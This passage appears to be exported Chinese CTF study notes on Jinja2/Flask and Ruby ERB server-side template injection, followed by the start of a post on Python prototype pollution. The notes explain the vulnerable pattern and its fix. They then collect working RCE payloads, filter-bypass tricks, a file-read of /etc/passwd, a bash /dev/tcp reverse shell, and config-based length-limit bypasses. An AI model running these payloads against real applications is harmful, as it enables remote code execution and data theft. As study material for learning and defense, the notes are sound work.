API。\n\n而flask默认使用jinja2作为渲染HTML页面的模板引擎，也是ssti漏洞的常见来源\n\n`Jinja2` 是 Python 中一个广泛使用的 **模板引擎**，主要用于动态生成 HTML、XML、配置文件等文本内容。\n\n## Jinja2的语法\n\nJinja2使用 {{name}}结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。\n\nJinja2 模板同样支持控制语句，像在` {%…%} `块中使用if语句\n\n```\n{%if 1==1%}air{%endif%}\n```\n\n接下来我利用vulhub的靶场起漏洞环境进行分析\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/usr/local/vulhub/flask/ssti# docker-compose up -d\n```\n\n目录自行看哈，这是flask下的ssti\n\n## 环境复现\n\n在起环境的时候我们先看一下环境下的app.py漏洞源码\n\n```python\nfrom flask import Flask, request\nfrom jinja2 import Template\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    name = request.args.get('name', 'guest')\n\n    t = Template(\"Hello \" + name)\n    return t.render()\n\nif __name__ == \"__main__\":\n    app.run()\n```\n\nt = Template(\"hello\" + name) 这行代码表示，将前端输入的name拼接到模板，但是此时没有对name参数进行一定的过滤和检测，那么我们如果传入?name={{8*8}}就会返回64的结果，这是因为Jinja2的基础语法`{{}}`会把其中的内容会被当作 Python 代码执行，并将结果渲染到页面上，这也是我们漏洞的成因\n\n## 防御方法\n\n那如果我们事先对模板进行渲染后再传入数据，那么就可以避免模板注入的存在，修复一下上面的漏洞代码\n\n```python\nfrom flask import Flask, request\nfrom jinja2 import Template\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    name = request.args.get('name', 'guest')\n\n    t = Template(\"Hello {{n}}\")\n    return t.render(n=name)\n\nif __name__ == \"__main__\":\n    app.run()\n```\n\nreturn t.render(n=name)这里将name参数作为字符串传给变量n，然后使用静态模板，`\"Hello {{n}}\"` 是一个固定模板，`{{n}}` 是一个 **参数占位符**，而非直接拼接的用户输入。这样就避免了ssti的存在\n\n![image-20250330173716682](../image/achieve/202411/ssti/image-20250330173716682.png)\n\n此时name的值已经被当成字符串传入n中并进行渲染，而8*8不会被当成python代码去解析执行\n\n讲完了防御方法，现在要讲一下怎么进行ssti注入达到恶意代码执行的目的\n\n## 攻击方法\n\n由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行\n\n但是在讲解攻击方法前，我们需要了解到python中的继承,因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果\n\n### python的继承\n\n- **Python 类继承的基本概念**\n\n基础语法\n\n```\nclass 子类(父类): \n    pass  # 子类定义\n```\n\n- **继承关系**：子类会继承父类的属性和方法（除非被覆盖）。\n- **继承链**：可以多重继承（`class C(A, B):...`），但这里仅讨论单继承（一个父类）。\n\n然后我们可以利用魔术方法去返回想要的类的内容\n\n基础语法\n\n```\n类名.__魔术方法__ 或 类名.魔术方法()。\n例如__base__返回父类\n类名.__base__ \n```\n\n例如我们这里有代码\n\n```python\nclass A: pass       # 基类（无父类，隐式继承自 `object`）\nclass B(A): pass    # B 继承 A\nclass C(B): pass    # C 继承 B\nclass D(C): pass    # D 继承 C\n```\n\n那么此时的继承链的关系是\n\n```\nobject （Python 所有类的基类）\n└── A   （直接继承 object）\n    └── B  （继承 A）\n        └── C  （继承 B）\n            └── D  （继承 C）\n```\n\npython类中如果没有显式指定父类，在 Python 3 中默认继承自 `object` 类，那我们如何找到某个类的当前类呢？\n\n我们可以通过`__class__`魔术方法去找到当前类\n\n```\n__class__　　：返回一个实例所属的类\n```\n\n```py\nclass A : pass\nclass B(A) : pass\nclass C(B) : pass\nclass D(C) : pass\nc = C()\nprint(c.__class__)\n#<class '__main__.C'>\n```\n\n可以看到它返回了一个当前的类为C，那我们尝试找到C类的父类\n\n可以通过`__base__`这个魔术方法来找到当前类的父类\n\n```\n__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）\n__base__　　 ：返回类的直接父类（单继承时）或第一个父类（多继承时）\n也就是说如果一个类如果继承了多个类，那么用bases可以返回所有继承的父类\n```\n\n```py\nclass A : pass\nclass B(A) : pass\nclass C(B) : pass\nclass D(C) : pass\nc = C()\nprint(c.__class__.__base__)\n#<class '__main__.B'>\n```\n\n可以看到它返回了C类的父类B类，如果还需要继续找父类可以继续用`__base__`，但是这样一个一个递进上去的方法有一些麻烦，所以我们可以使用`__mro__`魔术方法来一步到位看到类的所有父类\n\n```\n__mro__       ：返回一个元组，按顺序列出类的继承链（从当前类到 object）。\n```\n\n```py\nclass A : pass\nclass B(A) : pass\nclass C(B,A) : pass\nclass D(C,A) : pass\nc = C()\nprint(c.__class__.__mro__)\n#(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)\n```\n\n可以看到这里返回了继承链\n\n上面的知识都是基础知识，有利于我们后面对payload的讲解\n\n### SSTI模板注入\n\n通常我们进行模板注入的时候都会用到object类，因为`object` 是 Python 中**所有类的基类**（直接或间接继承）。\n\n接下来我们通过`__subclasses__()`去返回object的所有子类\n\n`__subclasses__()`和`__subclasses__`的区别是什么呢？\n\n前者是实际调用了该方法，而后者只是返回了方法本身的引用\n\n```\n__subclasses__()　　：以列表返回类的子类\n```\n\n这里我们需要用到A类啊这样更迅速一点，我们可以把这些魔术方法的使用当成是一种指针的指向，例如\n\n```\nc.__class__.__base__\n此时指针是指向B类的，如果我们去返回子类的话只是会返回B类的子类也就是C类\n[<class '__main__.C'>]\n如果需要返回object的子类的话，我们需要调整指针指向object类，再使用魔术方法去返回子类\n```\n\n所以\n\n```py\nclass A : pass\nclass B(A) : pass\nclass C(B) : pass\nclass D(C) : pass\na = A()\nprint(a.__class__.__base__.__subclasses__())\n#返回所有object的子类\n```\n\n![image-20250330180720867](../image/achieve/202411/ssti/image-20250330180720867.png)\n\n当然也可以根据`__mro__`返回的是元组的形式去调用object类并返回object的子类\n\n```\nprint(c.__class__.__mro__[3])#<class 'object'>\n```\n\n那么可以看到这里有很多的子类，我们最终的ssti注入的目的就是利用这些子类去进行RCE达到攻击的效果，接下来就是如何利用子类去攻击了，我们先拿一道ctfshow的web361做一下\n\n![image-20250331114331529](../image/achieve/202411/ssti/image-20250331114331529.png)\n\n然后我们用`__class__`魔术方法查看当前类\n\n```\n?name={{\"\".__class__}}#<class 'str'>\n?name={{().__class__}}#<class 'tuple'>\n```\n\n在 Python 中，**`__class__` 是一个魔术方法**，用于获取 **对象的类类型**\n\n![image-20250331115226114](../image/achieve/202411/ssti/image-20250331115226114.png)\n\n和上面不同的是，我们现在的这些都是内置类，但是最终的父类还是object，我们只需要一个途径能获取到object类就行\n\n```\n?name={{().__class__.__base__}}#<class 'object'>\n```\n\n这里的话就成功拿到object父类了，接下来就是拿所有内置的子类\n\n```\n?name={{().__class__.__base__.__subclasses__()}}\n```\n\n![image-20250331115604053](../image/achieve/202411/ssti/image-20250331115604053.png)\n\n然后我们可以用哪些子类去进行攻击呢？\n\n例如这里我们用`<class 'os._wrap_close'>`类，这是python的内置类\n\n- **`os` 是 Python 标准库**（内置模块），而 `_wrap_close` 是 `os` 模块中的一个 **内部辅助类**（名字以 `_` 开头，表示“内部使用”）。\n\n我们看看这个类有哪些属性和方法\n\n```\n>>> import os\n>>> print(os._wrap_close.__dict__)\n{'__module__': 'os', '__init__': <function _wrap_close.__init__ at 0x000001F51809F060>, 'close': <function _wrap_close.close at 0x000001F51809F100>, '__enter__': <function _wrap_close.__enter__ at 0x000001F51809F1A0>, '__exit__': <function _wrap_close.__exit__ at 0x000001F51809F240>, '__getattr__': <function _wrap_close.__getattr__ at 0x000001F51809F2E0>, '__iter__': <function _wrap_close.__iter__ at 0x000001F51809F380>, '__dict__': <attribute '__dict__' of '_wrap_close' objects>, '__weakref__': <attribute '__weakref__' of '_wrap_close' objects>, '__doc__': None}\n```\n\n整理一下\n\n```python\n{\n    '__module__': 'os',            # 类所属的模块\n    '__init__': <function ...>,    # 初始化方法\n    'close': <function ...>,       # 关闭文件描述符的方法\n    '__enter__': <function ...>,   # 实现上下文管理器（with语句）\n    '__exit__': <function ...>,    # 实现上下文管理器（with语句）\n    '__getattr__': <function ...>, # 动态获取属性\n    '__iter__': <function ...>,    # 实现迭代器协议\n    '__dict__': <attribute ...>,   # 类的属性字典\n    '__weakref__': <attribute ...>,# 弱引用支持\n    '__doc__': None                类的文档字符串（此处为None）\n}\n```\n\n然后我们需要用到这个类中的`__init__`方法去初始化这个类，这是 **构造函数**，在创建 `_wrap_close` 实例时调用。\n\n```\n?name={{().__class__.__base__.__subclasses__()[132]}}#<class 'os._wrap_close'>\n?name={{().__class__.__base__.__subclasses__()[132].__init__}}#<function _wrap_close.__init__ at 0x7f1b1c0f35e0>\n```\n\n然后会通过``.__globals__` 获取 `os` 模块的全局变量`\n\n```\n__globals__ 是 Python 中的一个 特殊属性，仅存在于函数对象（Function Objects）里，用于获取该函数所在的全局命名空间（Global Namespace） 的所有变量。它本质上是一个 字典，存储了该函数所在模块的所有全局变量、导入的模块、函数等。\n```\n\n![image-20250331121042196](../image/achieve/202411/ssti/image-20250331121042196.png)\n\n然后可以看到导入的os模块下有没有可以执行命令的函数方法\n\n我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}#root\n```\n\n到这里就大致讲完了攻击思路，我们就先总结一下上面用到的魔术方法\n\n## 魔术方法总结1\n\n```\n__class__　　：返回一个实例所属的类\n__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）\n__base__　　 ：返回类的直接父类（单继承时）或第一个父类（多继承时）\n__mro__       ：返回一个元组，按顺序列出类的继承链（从当前类到 object）。\n__subclasses__()  获取当前类的所有子类\n__init__  类的初始化方法\n__globals__  对包含(保存)函数全局变量的字典的引用\n```\n\n试一下刚刚vulhub的靶场一开始以为怎么没回显，后面才发现回显在源码中\n\n## payload积累\n\n- #使用`<class 'os._wrap_close'>`类的popen命令\n\n```\n().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()\n().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()\n\n''.__class__.__base__.__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()\n\n#python2\n''.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n```\n\n- #操作文件类，`<type ‘file’>`(python2中)\n\n**python3已经移除了file。所以利用file子类文件读取只能在python2中用。**\n\n1.读取文件\n\n```\n''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n''.__class__.__mro__[2].__subclasses__()[40]('文件路径').read()\n```\n\n![image-20250331150821322](../image/achieve/202411/ssti/image-20250331150821322.png)\n\n2.写文件\n\n```\n''.__class__.__mro__[2].__subclasses__()[40]('文件路径', 'w').write('文件内容')\n```\n\n![image-20250331150921338](../image/achieve/202411/ssti/image-20250331150921338.png)\n\n- 使用类调用os的popen执行命令\n\n```\n\n''.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n```\n\n- 利用`<class 'os._wrap_close'>`类执行eval\n\n```\n#python2\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('ls')\")\n\n\n#python3\n''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval'](\"__import__('os').popen('id').read()\")\n\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').system('ls')\")\n\n''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()' )\n\n```\n\n- 利用`os._wrap_close`反弹shell\n\n```\n''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1')\n```\n\n## 一些绕过手法\n\n### 绕过中括号过滤\n\n1.使用`__getitem__()`去进行绕过，例如\n\n```\n[132]\n换成\n__getitem__(132)\n```\n\n2.也可以用`.pop()`去绕过\n\n```\n[132]\n.pop(132)\n```\n\n### 绕过单双引号过滤\n\n1.使用request旁路注入去进行绕过\n\n通过request内置对象去得到请求的信息，从而传递参数\n\n```\n#GET方式，用request.args.参数 代替，然后用get传参\n['popen']\n可以换成\n[request.args.a]然后get传参a=popen\n\n#POAT方式，用request.values.参数 代替，然后用post传参\n['popen']\n可以换成\n[request.values.a]然后post传参a=popen\n\n#cookie方式，用request.cookies.参数 代替，然后用cookie传参\n['popen']\n可以换成\n[request.cookies.a]然后cookie传参a=popen\n```\n\n2.如果过滤了args或者不想用request内置类的话，还可以用chr拼接字符去绕过\n\n```\n{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}#第59个子类（通常是 warnings.catch_warnings），获取python内置chr()函数\n{{().__class__.__bases__.__getitem__(0).__subclasses__()[59](chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#这里是构造\n这里%2b为+号，在发送请求的时候需要编码成%2b，不然会被当成空格处理\n```\n\n3.手动构造char(可用于上面的chr被过滤的情况)\n\n如果目标系统 **限制了 `chr` 但允许变量赋值**，攻击者可能用 **模板语法动态构造 `char`**：\n\n```\n{% set char=config.__class__.__init__.__globals__.__builtins__.chr %}\n{{ char(99) }}  # 返回 'c'\n```\n\n### 绕过下划线过滤\n\n1.可以用request类去进行绕过\n\n2.基于小数点的绕过，可以用编码去绕过，例如16进制编码或者unicode编码，或者也可以用base64编码绕过\n\n```\n\"\".__class__\n\"\"['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']\n或者\n\"\"|attr('\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f')\n```\n\n### 绕过小数点过滤\n\n1.用|attr过滤器进行绕过\n\n```\n\"\".__class__\n\"\"|attr(\"__class__\")\n```\n\n2.**用 `[]` 替代 `.`**\n\n```\n\"\".__class__\n\"\"[\"__class__\"]\n```\n\n### 绕过花括号过滤\n\n- 用`{%print%}`去进行绕过\n\n```\n{%print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read())%}\n```\n\n- 用`{%%}`结构语句绕过\n\n```\n{% for c in [].__class__.__base__.__subclasses__() %}\n    {% if 'os' in c.__init__.__globals__ %}\n        {{ c.__init__.__globals__['os'].system('id') }}\n    {% endif %}\n{% endfor %}\n```\n\n这里if条件成立则会输出1，只是用来执行结果的，最终不影响执行结果(通常还可以用于无回显的时候打盲注)\n\n### 绕过关键字过滤\n\n- 编码绕过\n\n- 字符串拼接(“+”)绕过\n\n```\n{{()['__cla'+'ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev'+'al'](\"__im\"+\"port__('o'+'s').po\"\"pen('whoami').read()\")}} \n```\n\n- join拼接字符\n\n```\n{{[].__class__.__base__.__subclasses__()[40](\"fla\".join(\"/g\")).read()}}\n```\n\n- jinja中的`~`拼接\n\n```\n{{()[‘__class__’]}}等价于{%set a=’__cla’%}{%set b=’ss__’%}{{()[a~b]}}\n```\n\n- 用单双引号，反引号绕过关键字\n\n```\n{{[].__class__.__base__.__subclasses__()[40](\"fla\"\"g\")).read()}}\n{{[].__class__.__base__.__subclasses__()[40](\"fla''g\")).read()}}\n```\n\n- 16进制编码绕过\n\n```\n''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f']('os').popen('whoami').read()\n其中\n\"__import__\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"\n```\n\n4.对于python2的话，还可以利用base64进行绕过，对于python3没有decode方法，所以不能使用该方法进行绕过。\n\n```\n''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['X19pbXBvcnRfXw=='.decode('base64')]('os').popen('whoami').read()\n其中\n__import__的base64编码为X19pbXBvcnRfXw==\n```\n\n5.unicode编码\n\n```\n''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f']('os').popen('whoami').read()\n__import__==\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\n```\n\n其他的各种编码大部分也都是可以的\n\n### 绕过数字过滤\n\n- 利用算术去生成数字\n\n如果只是过滤了部分数字，我们可以用其他数字通过算术去得到\n\n- 编码绕过\n- 过滤器length获取数据结构的长度\n\n```\n{% set a=’aaaaaaaaaa’|length %}{{“”.__class__.__bases__.__subclasses__()[a].__init__.__ globals__[‘os’].popen(“ls”).read()}}\n```\n\n### 绕过符号过滤\n\n利用flask内置函数和对象获取符号\n\n```\n{% set a=({}|select()|string()) %}{{a}} #获取下划线\n\n{% set a=({}|self|string()) %} {{a}} #获取空格\n\n{% set a=(self|string|urlencode) %}{{a}}  #获取百分号\n```\n\n## ssti长度限制绕过\n\n这个知识点我吃了很多次亏了，好多次考到都不会。。。\n\n当代码中存在长度限制并**未过滤任何字符**且**长度的限制较大**时，应优先考虑使用较短的 Payload 尝试命令执行。\n\n如果使用常规 Payload 比如 __subclasses__ 或 __class__，肯定会导致 Payload 过长。\n\n例如DSBCTF单身杯的ezzz_ssti，限制了40长度的字符，payload打到\n\n```\n{{\"\".__class__.__base__}}\n```\n\n后面的subclasses就无法继续打了\n\n![image-20250430163926050](../image/achieve/202411/DSBCTF单身杯/image-20250430163926050.png)\n\n因此我们要在这里使用 Flask 内置的全局函数来构造我们的 Payload：\n\n### url_for函数\n\n`url_for` 是 Flask 框架中的一个内置函数，用于生成 URL。\n\n![image-20250430164138328](../image/achieve/202411/DSBCTF单身杯/image-20250430164138328.png)\n\n我们看看该函数全局下有哪些可用的模块和方法\n\n使用 __globals__ 属性来获取函数**当前全局空间**下的所有**模块**、函数及属性\n\n```python\nfrom flask import *\n\nprint(url_for.__globals__)\n```\n\n![image-20250430164622238](../image/achieve/202411/ssti/image-20250430164622238.png)\n\n可以看到这里有eval函数和os模块\n\n![image-20250430164834987](../image/achieve/202411/ssti/image-20250430164834987.png)\n\n![image-20250430164845219](../image/achieve/202411/ssti/image-20250430164845219.png)\n\n我们看一下os模块下有哪些函数\n\n```python\nimport os\n\n# 获取 os 模块中的所有函数\nfunctions = [name for name in dir(os) if callable(getattr(os, name))]\n\n# 输出函数列表\nfor func in functions:\n    print(func)\n\n```\n\n然后我们可以利用os模块中的popen函数\n\n```\n{{url_for.__globals__.os.popen('whoami').read()}}\n```\n\n因为 popen 函数返回的结果是个**文件对象**，因此需要调用 **read() 函数**来获取执行结果。\n\n但是上面那个方法其实还是超过了40个字符的，但也算是一种字符长度限制绕过的一个相对较短的payload了\n\n### 将 Payload 保存在 config 全局对象中\n\n这个的话就是参照的DSBCTF官方解来做的一个学习\n\n简单来说就是Flask 框架中存在`config`全局对象，用来保存配置信息。`config` 对象实质上是一个字典的子类，可以像字典一样操作，而`update`方法又可以更新python中的字典。我们就可以利用 Jinja 模板的 `set` 语句配合字典的 `update()` 方法来更新 `config` 全局对象，将字典中的`lipsum.__globals__`更新为`g`，就可以达到在 `config` 全局对象中分段保存 `Payload`，从而绕过长度限制。\n\n先举个例子\n\n```python\nd = {'a': 1, 'b': 2, 'c': 3}\n\nd.update(d=4)\n\nprint(d)\n#{'a': 1, 'b': 2, 'c': 3, 'd': 4}\n```\n\n然后结合Jinja2中的set语句去设置模板变量，例如\n\n```\n{%set x=config.update(a=config.update)%}\n```\n\n这会带来什么结果呢？\n\n```python\nconfig = {}\nconfig.update(a=config.update)\nprint(config)  # 输出: {'a': <built-in method update of dict object at 0x000002307ECE7A40>}\n```\n\n我们在题目中看看，先传入\n\n```\n?user={%set x=config.update(a=config.update)%}\n```\n\n然后查看一下config\n\n![image-20250430170928255](../image/achieve/202411/DSBCTF单身杯/image-20250430170928255.png)\n\n可以看到此时确实是设置了一个config的键值a，那我们利用a去更新其他的键值\n\n```\n{%set x=config.a(f=lipsum.__globals__)%}   //f的值被更新为lipsum.__globals__ \n{%set x=config.a(o=config.f.os)%}          //o的值被更新为lipsum.__globals__.os\n{%set x=config.a(p=config.o.popen)%}       //p的值被更新为lipsum.__globals__.os.popen\n{{config.p(\"cat /t*\").read()}}\n```\n\n![image-20250430171107666](../image/achieve/202411/DSBCTF单身杯/image-20250430171107666.png)\n\n直接打就行，这里能省去一大部分的字符，也是一种很好的绕过方法\n\n## Ruby下的ERB模板注入\n\nERB是Ruby自带的模板引擎\n\n- <% 写逻辑脚本(Ruby语法) %>\n- <%= 直接输出变量值或运算结果 %>\n\n如何判断是否存在模板注入呢？\n\n查找 ERB.new 使用点，然后检查用户输入是否被转义或过滤才传入模板，如果没有就存在SSTI\n\n例如\n\n```ruby\ntemplate = \"<h1>Hello, #{params[:name]}</h1>\"\nERB.new(template).result(binding)\n```\n\n这里很明显是一种拼接的方法，而没有任何的处理，所以我们可以传入ERB表达式\n\n### 常见的payload\n\n```ruby\n<%= 7 * 7 %>\n<%= File.open(‘/etc/passwd’).read %>\n<%= self %>    //枚举该对象可用的属性及方法\n<%= self.class.name %>   //获取self对象的类名\n<%= self.methods %>\t\t//获取当前类的可用方法\n<%= system(\"whoami\")%>\t//执行系统命令\n```\n\n还有一些Ruby的全局变量\n\n### Ruby全局变量\n\n|   Ruby全局变量    |                           中文释义                           |\n| :---------------: | :----------------------------------------------------------: |\n|        $!         |                           错误信息                           |\n|        $@         |                        错误发生的位置                        |\n|        $0         |                     正在执行的程序的名称                     |\n|        $&         |                       成功匹配的字符串                       |\n|        $/         |                   输入分隔符，默认为换行符                   |\n|        $\\         |                 输出记录分隔符（print和IO）                  |\n|        $.         |                 上次读取的文件的当前输入行号                 |\n|      $; $-F       |                        默认字段分隔符                        |\n|        $,         |            输入字符串分隔符，连接多个字符串时用到            |\n|        $=         |                         不区分大小写                         |\n|        $~         |                       最后一次匹配数据                       |\n|        $`         |                     最后一次匹配前的内容                     |\n|        $’         |                     最后一次匹配后的内容                     |\n|        $+         |                     最后一个括号匹配内容                     |\n|       $1~$9       |                         各组匹配结果                         |\n|      $< ARGF      | 命令行中给定的文件的虚拟连接文件（如果未给定任何文件，则从$stdin） |\n|        $>         |                        打印的默认输出                        |\n|        $_         |                  从输入设备中读取的最后一行                  |\n|      $* ARGV      |                          命令行参数                          |\n|        $$         |                   运行此脚本的Ruby的进程号                   |\n|        $?         |                    最后执行的子进程的状态                    |\n|      $: $-I       |                 加载的二进制模块（库）的路径                 |\n|        $“         |                 数组包含的需要加载的库的名字                 |\n|    $DEBUG $-d     |                    调试标志，由-d开关设置                    |\n| $LOADED_FEATURES  |                           $“的别名                           |\n|     $FILENAME     |                     来自$<的当前输入文件                     |\n|    $LOAD_PATH     |                              $:                              |\n|      $stderr      |                       当前标准误差输出                       |\n|      $stdin       |                         当前标准输入                         |\n|      $stdout      |                         当前标准输出                         |\n|   $VERBOSE $-v    |                  详细标志，由-w或-v开关设置                  |\n|        $-0        |                              $/                              |\n|        $-a        |                             只读                             |\n|        $-i        |           在in-place-edit模式下，此变量保存扩展名            |\n|        NIL        |                            0本身                             |\n|        ENV        |                         当前环境变量                         |\n|   RUBY_VERSION    |                           Ruby版本                           |\n| RUBY_RELEASE_DATE |                           发布日期                           |\n|   RUBY_PLATFORM   |                          平台标识符                          |\n","tags":["SSTI的积累"],"categories":["SSTI"]},{"title":"python原型链污染","url":"/2025/04/30/pyhton原型链污染/","content":"\n# 0x01废话\n\n碰到一道nodejs的原型链污染，但我的包师傅让我先去学python的原型链污染，所以我比较听劝，马上就来学习一下，这篇文章的话也会对python的一些基础概念进行一个总结\n\n# 0x02正文\n\n讲到原型链污染，我们首先都知道什么是原型链污染\n\n## 什么是原型链污染?\n\nPython 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术。\n\n## 关于原型链?\n\n在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找\n\n## 攻击原理\n\n原型链污染攻击的思路是通过**修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果**。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等\n\nPython原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。\n\n## 类和实例\n\n在讲述原型链污染之前，我们要先了解python中的类和实例的关系\n\n因为python是以OOP(面向对象编程)的方式进行编程的，这里的话包括了几个核心的概念\n\n- **类（Class）**：类是一个模板或蓝图，它定义了对象的属性和方法（即行为）。\n- **对象（Object）**：对象是类的实例。每个对象都有自己独立的属性（数据）和方法（函数）。\n- **封装（Encapsulation）**：封装是将数据和操作数据的方法绑定在一起的过程，它隐藏了对象的内部实现细节，只暴露必要的接口给外部使用。\n- **继承（Inheritance）**：继承允许我们基于现有的类创建新类，新类（子类）可以继承现有类（父类）的属性和方法，并添加新的属性和方法或重写现有的方法。\n- **多态（Polymorphism）**：多态允许我们使用统一的接口来调用不同类中的方法，这些方法可以有不同的实现。\n\n我们先讲类和对象，因为这个的话其实和后面的实例还是有关联的\n\n和php类似的，在python中，类是通过class去定义的，类定义了一个对象的模板，里面包括了对象的属性和方法，一般我们叫做类属性(类变量)和类方法\n\n具体实例\n\n```python\nclass name:\n    name = \"John\"#类属性\n    age = 25\n    def __init__(self, name, age):#实例方法\n        self.name = name#实例属性\n        self.age = age#实例属性\n\n    def display(self):\n        print(\"Name:\", self.name)\n        print(\"Age:\", self.age)\n\n#实例化对象\na = name(\"Jane\", 30)\n#访问对象的属性\nprint(a.name)\nprint(a.age)\n#调用对象的方法\na.display()\n#Jane\n#30\n#Name: Jane\n#Age: 30\n```\n\n在这个例子中，name是一个类，里面定义了name和age属性，还定义了一个\\_\\_init\\__是一种特殊的方法，类似于php里面的construct魔术方法，被称为初始化方法。然后下面对类实例化成对象，并举例了怎么访问对象的属性和调用对象的方法\n\n接下来我们讲一下实例方法\n\n实例方法是与对象实例相关联的方法。它们通过对象的引用来调用，并且可以访问和修改对象的属性。实例方法的第一个参数通常是 `self`，它是对当前对象的引用。在调用实例方法时，Python 会自动将调用该方法的对象作为 `self` 参数传递。\n\n```php\nclass Car:\n    def __init__(self, make, model, year):\n        self.make = make\n        self.model = model\n        self.year = year\n        self.odometer_reading = 0\n\n    # 实例方法，用于描述对象的行为\n    def describe(self):\n        return f\"{self.year} {self.make} {self.model}\"\n\n    # 另一个实例方法，用于更新对象的属性\n    def update_odometer(self, mileage):\n        if mileage >= self.odometer_reading:\n            self.odometer_reading = mileage\n        else:\n            print(\"You can't roll back an odometer!\")\n\n# 创建对象\nmy_car = Car('audi', 'a4', 2016)\n\n# 调用实例方法\nprint(my_car.describe())  # 输出: 2016 audi a4\n\n# 更新对象的属性\nmy_car.update_odometer(1000)\nprint(my_car.odometer_reading)  # 输出: 1000\n\n```\n\n在这个例子中，`Car` 类定义了一个汽车对象的模板，包括制造商（`make`）、型号（`model`）、年份（`year`）和里程表读数（`odometer_reading`）等属性。`describe` 和 `update_odometer` 是实例方法，它们分别用于描述汽车的信息和更新里程表读数。\n\n## 污染条件\n\n主要的就是一个merge合并函数，merge函数就是python中对属性值控制的一个操作，通过merge函数去修改类属性的值，结合nodejs的merge来理解就是将源参数赋值到目标参数。\n\n在我们的CTF中，常见的merge函数就是\n\n```python\ndef merge(src, dst):  #src为源字典，dst为目标字典\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'): \n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))  \n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:  \n            merge(v, getattr(dst, k))  \n        else:\n            setattr(dst, k, v)\n\n```\n\n这个函数的主要目的是将一个源字典（`src`）的内容合并到目标字典（`dst`）中，支持嵌套字典的递归合并。我们逐句分析一下\n\n```\nfor k, v in src.items():\n```\n\n这里的话会遍历src的键值对，k是字典src的键，v是字典src的值，而`src.items()`是返回一个包含字典所有键值对的视图对象（`dict_items`），每个键值对以元组 `(k, v)` 的形式表示。\n\n```\nif hasattr(dst, '__getitem__'):\n```\n\n### hasattr()函数\n\n`hasattr` 是 Python 内置的一个函数，用于检查一个对象是否具有指定的属性。\n\n基础语法\n\n```python\nhasattr(object, name)\n```\n\n- **object**: 这是要检查的对象。\n- **name**: 这是要检查的属性名称，必须是一个字符串。\n\n这里通过hasattr函数 **检查对象是否具有指定的属性或方法**，这里用来检查dst中是否有`__getitem__`方法，用于实现对象的索引操作，如果 `dst` 是列表、字典、元组、字符串等支持索引操作的对象，则条件为真。\n\n- 如果此时的dst是字典或其他类似字典的对象，则进如if语句\n\n```python\nif dst.get(k) and type(v) == dict:\n    merge(v, dst.get(k))  \nelse:\n    dst[k] = v\n```\n\n`dst.get(k)`去获取dst中k的值，检查k的值是否存在且v是否是字典，如果是则执行`merge(v, dst.get(k)) `，也就是将v作为src源字典传入，dst中的k值作为新的目标字典dst传入，继续递归调用merge，如果不是则令dst中k对应的值为v的值\n\n- 